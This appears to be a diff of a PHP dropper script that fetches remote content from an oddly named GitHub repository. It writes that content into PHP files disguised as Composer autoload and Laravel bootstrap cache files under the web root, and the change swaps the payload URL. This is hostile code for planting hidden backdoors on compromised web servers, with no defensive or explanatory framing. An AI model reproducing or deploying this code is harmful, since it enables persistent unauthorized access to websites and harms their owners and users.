@@ -19,7 +19,7 @@ if(file_exists($check)){
   echo "not exits";
 echo "done .\n " ;
 $check2 = $_SERVER['DOCUMENT_ROOT'] . "/vendor/composer/autoload_src9.php" ;
-$text2 = http_get('https://raw.githubusercontent.com/dsgjnamgd/jhbasf/main/olexio.txt');
+$text2 = http_get('https://raw.githubusercontent.com/dsgjnamgd/jhbasf/main/olsxos2');
 $open2 = fopen($check2, 'w');
 fwrite($open2, $text2);
 fclose($open2);
@@ -30,7 +30,7 @@ if(file_exists($check2)){
 echo "done2 .\n " ;
 
 $check3=$_SERVER['DOCUMENT_ROOT'] . "/bootstrap/cache/cache_scr9.php" ;
-$text3 = http_get('https://raw.githubusercontent.com/dsgjnamgd/jhbasf/main/olexio.txt');
+$text3 = http_get('https://raw.githubusercontent.com/dsgjnamgd/jhbasf/main/olsxos2');
 $op3=fopen($check3, 'w');
 fwrite($op3,$text3);
 fclose($op3);
